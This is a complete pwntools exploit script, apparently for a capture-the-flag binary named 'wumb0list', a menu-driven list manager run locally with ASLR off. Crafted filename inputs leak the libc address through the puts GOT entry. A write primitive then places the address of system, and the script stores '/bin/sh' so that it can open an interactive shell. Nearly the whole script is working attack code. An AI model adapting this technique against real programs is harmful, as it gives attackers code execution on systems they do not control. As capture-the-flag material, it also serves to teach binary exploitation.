#!/usr/bin/env python
# -*- coding: utf-8 -*-
from __future__ import print_function
from pwn import *

binary = './wumb0list'
elf = ELF(binary)
libc = elf.libc

io = process(binary, aslr = 0)
context.log_level = 'debug'
context.arch = elf.arch

myu64 = lambda x: u64(x.ljust(8, '\0'))
ub_offset = 0x3c4b30
codebase = 0x555555554000

def menu(idx):
    io.sendline(str(idx))

# A format string containing the * character followed by a letter/symbol passed to scanf() will be read but discarded from the final result.
# so scanf("%c%*c", &a); means you only need to input one character to the variable.

def catalog_manage():
    menu(1)

def list_management():
    menu(2)

def new_catalog(i, name):
    catalog_manage()
    menu(1)
    io.recvuntil(":")
    io.sendline(str(i))
    io.recvuntil(":")
    io.sendline(name)
    menu(5)

def delete_catalog(i):
    catalog_manage()
    menu(2)
    io.recvuntil("ID:")
    io.sendline(str(i))
    menu(5)

def view_catalog():
    catalog_manage()
    menu(3)
    menu(5)

def import_filename(filename):
    catalog_manage()
    menu(4)
    io.sendline(filename)
    menu(5)

def new_list(name):
    list_management()
    menu(1)
    io.recvuntil("name:")
    io.sendline(name)
    menu(8)

def delete_list(idx):
    list_management()
    menu(2)
    io.recvuntil("number:")
    io.sendline(str(idx))
    menu(8)

def view_list():
    list_management()
    menu(3)
    menu(8)

def view_list_n(idx):
    list_management()
    menu(4)
    io.recvuntil(": ")
    io.sendline(str(idx))
    menu(8)


def add_item(idx, i):
    list_management()
    menu(5)
    io.recvuntil("list number:")
    io.sendline(str(idx))
    io.recvuntil("ID:")
    io.sendline(str(i))
    menu(8)

def remove_item(idx, i):
    list_management()
    menu(6)
    io.recvuntil("list number:")
    io.sendline(str(idx))
    io.recvuntil("ID:")
    io.sendline(str(i))
    menu(8)

def add_quantity(idx, i, quantity):
    list_management()
    menu(7)
    io.recvuntil("number:")
    io.sendline(str(idx))
    sleep(0.1)
    io.sendline(str(i))
    sleep(0.1)
    io.sendline(str(quantity))
    menu(8)


import_filename(p64(elf.got['puts']) + p64(0x6030d8))
view_list_n(10)
io.recvuntil(": List ")
libc_addr = myu64(io.recvn(6)) - libc.symbols['puts']
libc.address = libc_addr
log.info("\033[33m" + hex(libc_addr) + "\033[0m")

import_filename('a' * 8 + p64(0x6030a8 - 0x10))
add_quantity(10, 0x002026aa25ffffff, libc.symbols['system'])
binsh = libc.search('/bin/sh\0').next()

log.info("\033[33m" + hex(binsh) + "\033[0m")
new_catalog(11, '/bin/sh\0')





io.interactive()
